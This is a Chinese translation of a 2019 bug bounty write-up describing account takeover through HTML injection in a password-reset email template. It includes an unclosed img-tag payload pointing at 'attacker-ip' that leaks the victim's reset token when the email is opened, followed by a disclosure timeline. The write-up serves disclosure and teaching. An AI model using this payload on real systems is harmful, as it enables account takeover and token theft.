<html>
<head>
<title>Unauthenticated Account Takeover Through HTTP Leak</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过HTTP泄漏未经验证的帐户接管</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/unauthenticated-account-takeover-through-http-leak-33386bb0ba0b?source=collection_archive---------0-----------------------#2019-04-11">https://infosecwriteups.com/unauthenticated-account-takeover-through-http-leak-33386bb0ba0b?source=collection_archive---------0-----------------------#2019-04-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="2f0f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用“app”关键字代替应用程序名，因为它是私人程序。</p><p id="fa74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在测试忘记密码功能时，我发现应用程序发送了一个post请求，如下图所示:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/5f58bf5a45eee7d1dd4100c72de2c5bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8ExMyLKN-c7q8qin91hkrg.png"/></div></div></figure><p id="aa66" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你注意到这个请求，emailBody使用了一个模板。让我们首先测试，如果我们可以控制这个值，并尝试注入html。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kx"><img src="../Images/ebc424b2a5df03b41b64655e193decb2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mJFb0JZ-h1qomnoMcULPhQ.png"/></div></div></figure><p id="2d36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上图中，我一直在邮件正文中发送<a>标签，以下是我得到的回复:</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ky"><img src="../Images/4d3237c7cd1a1392ec8a6ec337bd6d86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RvQd2yW_83YBXC5PSukQpA.jpeg"/></div></div></figure><p id="266a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如您所看到的，我们可以控制emailBody，并且电子邮件模板中使用的用户输入没有经过净化(HTML注入)。但是等等，有什么影响呢？此时，我想到了尝试HTTP Leak来泄露一个受害者的密码重置令牌。</p><blockquote class="kz la lb"><p id="c70d" class="jn jo lc jp b jq jr js jt ju jv jw jx ld jz ka kb le kd ke kf lf kh ki kj kk ij bi translated">“HTTP泄漏”，这是一种情况，HTML元素和属性的特定组合导致对外部资源的请求被触发——当它不应该被触发时(<a class="ae lg" href="https://github.com/cure53/HTTPLeaks" rel="noopener ugc nofollow" target="_blank">来源</a></p></blockquote><p id="fb1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了实现它，你只需要在[重置链接]之前使用下面的有效负载</p><pre class="km kn ko kp gt lh li lj lk aw ll bi"><span id="d1fc" class="lm ln iq li b gy lo lp l lq lr">&lt;img src=\"http://attacker-ip/?id=</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ls"><img src="../Images/aff156d132c2e6006962a025a5db1bb3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SOHhS70uMzCbL_9FGDZFKg.png"/></div></div></figure><p id="d4c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并将该请求转发给服务器。现在，一旦受害者打开电子邮件，密码重置令牌将被发送到攻击者的IP地址，如下图所示:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lt"><img src="../Images/310dc49ffdca463a521a388d0c92c807.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dgyR9_DCeahEi90ZqyUrQQ.jpeg"/></div></div></figure><p id="6f52" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，攻击者可以简单地使用密码重置令牌重置密码，这样，就可以接管应用程序上的任何帐户。</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="lu lv l"/></div></figure><p id="5164" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是与所有主要的电子邮件服务提供商Gmail和Yahoo一起工作的，虽然这在他们那里不是问题，只是用户在电子邮件模板中的输入没有被净化。</p><p id="3b24" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">时间线:</strong></p><ul class=""><li id="1a4f" class="lw lx iq jp b jq jr ju jv jy ly kc lz kg ma kk mb mc md me bi translated">2019年1月8日—报告了该问题</li><li id="087c" class="lw lx iq jp b jq mf ju mg jy mh kc mi kg mj kk mb mc md me bi translated">2019年1月10日—审判</li><li id="3b32" class="lw lx iq jp b jq mf ju mg jy mh kc mi kg mj kk mb mc md me bi translated">2019年1月10日—已支付赏金</li></ul><p id="d66e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">参考文献:</strong></p><div class="mk ml gp gr mm mn"><a href="https://github.com/cure53/HTTPLeaks" rel="noopener  ugc nofollow" target="_blank"><div class="mo ab fo"><div class="mp ab mq cl cj mr"><h2 class="bd ir gy z fp ms fr fs mt fu fw ip bi translated">cure53/HTTPLeaks</h2><div class="mu l"><h3 class="bd b gy z fp ms fr fs mt fu fw dk translated">所有可能的方式，一个网站可以泄漏HTTP请求</h3></div><div class="mv l"><p class="bd b dl z fp ms fr fs mt fu fw dk translated">github.com</p></div></div><div class="mw l"><div class="mx l my mz na mw nb kv mn"/></div></div></a></div></div></div>    
</body>
</html>